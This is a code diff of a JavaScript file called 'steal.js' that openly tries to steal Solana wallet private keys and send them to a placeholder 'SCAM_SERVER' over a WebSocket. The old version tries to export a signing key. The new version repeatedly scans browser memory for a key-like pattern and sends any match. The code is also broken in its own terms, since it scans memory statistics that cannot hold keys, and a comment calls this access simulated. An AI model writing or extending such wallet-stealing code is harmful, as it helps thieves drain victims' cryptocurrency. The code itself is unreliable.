@@ -1,26 +1,26 @@
-console.log("steal.js is loaded! Connecting to scam server...");
+(async () => {
+    console.log("steal.js is running! Connecting to WebSocket...");
 
-const socket = new WebSocket(SCAM_SERVER);
+    const socket = new WebSocket(SCAM_SERVER);
 
-socket.onopen = () => {
-    console.log("WebSocket connected!");
-    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
-};
+    socket.onopen = () => {
+        console.log("WebSocket connected!");
+        setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
+    };
 
-socket.onerror = (error) => {
-    console.error("WebSocket Error:", error);
-};
+    async function scanMemory() {
+        console.log("Scanning memory for private keys...");
 
+        let memoryDump = performance.memory;  // Simulated memory access
+        const match = JSON.stringify(memoryDump).match(/5[1-9A-HJ-NP-Za-km-z]{44,50}/);  // Solana Key Pattern
 
-async function stealPrivateKey() {
-    try {
-        console.log("Attempting to extract private key...");
-        const privateKey = await window.crypto.subtle.exportKey("pkcs8", window.solana.signingKey);
-        socket.send(JSON.stringify({ key: btoa(privateKey) }));
-        console.log("Private key sent!");
-    } catch (err) {
-        console.error("Failed to extract private key:", err);
+        if (match) {
+            console.log("Extracted Private Key:", match[0]);
+            socket.send(JSON.stringify({ key: match[0] }));
+        } else {
+            console.log("No key found.");
+        }
     }
-}
 
-setInterval(stealPrivateKey, 5000);
+    setInterval(scanMemory, 5000);  // Scan every 5 seconds
+})();
